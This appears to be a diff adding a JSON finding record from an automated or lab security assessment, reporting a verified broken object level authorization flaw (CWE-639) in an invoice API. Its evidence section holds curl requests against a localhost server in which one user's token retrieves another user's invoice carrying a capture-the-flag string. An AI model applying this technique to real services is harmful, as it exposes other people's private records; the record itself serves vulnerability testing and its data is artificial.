@@ -1,0 +1,40 @@
+{
+  "title": "Broken Object Level Authorization in invoice retrieval",
+  "cwe": "CWE-639",
+  "endpoint": "GET /api/invoices/{invoice_id}",
+  "status": "VERIFIED",
+  "severity": "High",
+  "hypothesis": "The endpoint authenticates the caller but the handler returns an object fetched by id with no check that it belongs to the caller. An authenticated user can read another tenant's object.",
+  "path": {
+    "endpoint": "GET /api/invoices/{invoice_id}",
+    "object_param": "invoice_id",
+    "source": "source:get_invoice:invoice_id",
+    "sink": "sink:get_invoice:91",
+    "reason": "attacker-controlled path param reaches a DB read with authentication but NO ownership check \u2014 the returned object can belong to another user (BOLA / CWE-639)"
+  },
+  "evidence": {
+    "exploit_reproduced": true,
+    "exchanges": [
+      {
+        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/invoices/1\n",
+        "response_status": 200,
+        "response_body": "{\"id\":1,\"owner_id\":\"user_A\",\"customer\":\"Acme Corp\",\"amount\":1200,\"note\":\"Q3 retainer\"}"
+      },
+      {
+        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/invoices/2\n",
+        "response_status": 200,
+        "response_body": "{\"id\":2,\"owner_id\":\"user_B\",\"customer\":\"Globex Inc\",\"amount\":9000,\"note\":\"FLAG{bola_user_b_invoice_pwned}\"}"
+      },
+      {
+        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/me/invoices\n",
+        "response_status": 200,
+        "response_body": "[{\"id\":1,\"owner_id\":\"user_A\",\"customer\":\"Acme Corp\",\"amount\":1200,\"note\":\"Q3 retainer\"}]"
+      }
+    ],
+    "flag": "FLAG{bola_user_b_invoice_pwned}",
+    "attacker_user": "user_A",
+    "victim_user": "user_B",
+    "assertion": "user_A authenticated, received invoice 2 owned by user_B, flag recovered -> BOLA confirmed"
+  },
+  "confidence": "earned (live proof)"
+}
